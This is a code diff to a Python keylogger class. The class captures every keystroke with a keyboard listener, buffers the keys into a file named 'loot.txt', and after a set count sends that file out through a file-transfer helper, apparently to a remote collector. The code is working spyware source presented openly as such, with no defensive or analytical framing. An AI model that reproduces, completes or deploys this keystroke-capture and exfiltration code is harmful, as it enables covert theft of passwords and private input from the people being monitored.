@@ -6,7 +6,7 @@ from fileUtils import FileTransfer
 
 
 class Keylogger(object):
-    def __init__(self, ftp):
+    def __init__(self):
         config = ConfigParser.ConfigParser()
         config.read('setup.config')
 
@@ -17,10 +17,11 @@ class Keylogger(object):
         self.password = config.get('Encryption', 'password')
 
         self.listener = keyboard.Listener(on_press=self.onPress)
-        self.savedFile = ".loot.txt"
+        self.savedFile = "loot.txt"
         self.buffer = ""
-        self.bufferSize = 8
-        self.fileTransfer = ftp
+        self.count = 0
+        self.bufferSize = 16
+        self.fileTransfer = FileTransfer()
 
     def onPress(self, key):
         try:
@@ -28,7 +29,7 @@ class Keylogger(object):
         except AttributeError:
             keys = '<' + str(key) + '>'
 
-        self.send(keys)
+        self.saveKey(keys)
 
     def start(self):
         if not self.listener.isAlive():
@@ -45,10 +46,15 @@ class Keylogger(object):
 
     def saveKey(self, keys):
         self.buffer += keys
-        if len(self.buffer) < self.bufferSize:
+        self.count += 1
+        if self.count < self.bufferSize:
             return
         else:
-            with open(self.savedFile, "a") as savedFile:
+            with open(self.savedFile, "wb") as savedFile:
                 savedFile.write(self.buffer)
-                self.buffer = ""
-                self.fileTransfer.sendFile(self.savedFile)
+            self.fileTransfer.sendFile(self.savedFile)
+            self.reset()
+
+    def reset(self):
+        self.buffer = ""
+        self.count = 0
